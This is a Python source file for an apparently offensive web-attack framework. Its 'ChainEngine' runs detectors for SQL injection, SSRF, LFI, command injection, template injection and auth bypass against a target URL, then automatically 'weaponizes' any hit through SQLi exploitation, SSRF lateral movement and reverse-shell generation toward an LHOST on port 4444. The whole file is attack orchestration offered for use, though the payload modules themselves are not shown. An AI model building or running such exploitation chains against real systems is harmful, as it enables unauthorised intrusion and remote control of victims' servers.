from typing import Dict, Optional, List
import requests

CHAIN_PATHS = {
    "sqli_to_rce": ["sqli_detect", "sqli_weaponizer", "reverse_shell"],
    "ssrf_to_pwn": ["ssrf_detect", "ssrf_lateral", "ssrf_pwn"],
    "lfi_to_rce": ["lfi_detect", "lfi_scanner", "reverse_shell"],
    "auth_bypass_to_pwn": ["auth_bypass", "jwt_exploit", "reverse_shell"],
    "full_chain": ["crawl", "param_mine", "detect_all", "weaponize_all"],
}


class ChainEngine:
    def __init__(self, sess: Optional[requests.Session] = None, timeout: float = 10.0):
        self.sess = sess or requests.Session()
        self.timeout = timeout
        self.results = {}

    def detect_all(self, url: str, param: str) -> Dict:
        results = {}
        from tools import sql_injection, xss_detector, ssti_detector, cmdi_detector
        from tools import ssrf_detector, nosqli_detector, lfi_scanner, auth_bypass
        detectors = [
            ("sqli", lambda: sql_injection.check(url, param, self.sess, self.timeout)),
            ("xss", lambda: xss_detector.check(url, param, self.sess, self.timeout)),
            ("ssti", lambda: ssti_detector.check(url, param, self.sess, self.timeout)),
            ("cmdi", lambda: cmdi_detector.check(url, param, self.sess, self.timeout)),
            ("ssrf", lambda: ssrf_detector.check(url, param, self.sess, self.timeout)),
            ("nosqli", lambda: nosqli_detector.check(url, param, self.sess, self.timeout)),
            ("lfi", lambda: lfi_scanner.check(url, param, self.sess, self.timeout)),
            ("auth_bypass", lambda: auth_bypass.check(url, self.sess, self.timeout)),
        ]
        for name, fn in detectors:
            try:
                r = fn()
                if isinstance(r, dict) and r.get("vulnerable"):
                    results[name] = r
            except:
                pass
        return results

    def weaponize_all(self, url: str, param: str, lhost: str = "LHOST",
                       lport: int = 4444) -> Dict:
        results = {}
        from tools import sqli_weaponizer, sqli_blind, sqli_oob
        from tools import ssrf_lateral, ssrf_pwn, reverse_shell
        try:
            results["sqli"] = sqli_weaponizer.check(url, param, self.sess, self.timeout)
        except:
            pass
        try:
            results["ssrf_lateral"] = ssrf_lateral.run(url, param, self.sess, self.timeout)
        except:
            pass
        try:
            results["ssrf_pwn"] = ssrf_pwn.check(url, param, self.sess, self.timeout)
        except:
            pass
        try:
            results["reverse_shells"] = reverse_shell.run(lhost, lport)["shells"]
        except:
            pass
        return results

    def weaponize_ssrf_lateral(self, url: str, param: str,
                                lhost: str = "LHOST", lport: int = 4444) -> Dict:
        from tools import ssrf_lateral
        return ssrf_lateral.run(url, param, self.sess, self.timeout)

    def full_chain(self, url: str, param: str, lhost: str = "LHOST",
                    lport: int = 4444) -> Dict:
        result = {"target": "%s?%s=" % (url, param)}
        result["detection"] = self.detect_all(url, param)
        if any(r.get("vulnerable") for r in result["detection"].values()):
            result["weaponization"] = self.weaponize_all(url, param, lhost, lport)
        result["chain_paths"] = list(CHAIN_PATHS.keys())
        return result

    def run(self, url: str, param: str, chain: str = "full_chain") -> Dict:
        if chain in CHAIN_PATHS:
            return self.full_chain(url, param)
        return self.full_chain(url, param)
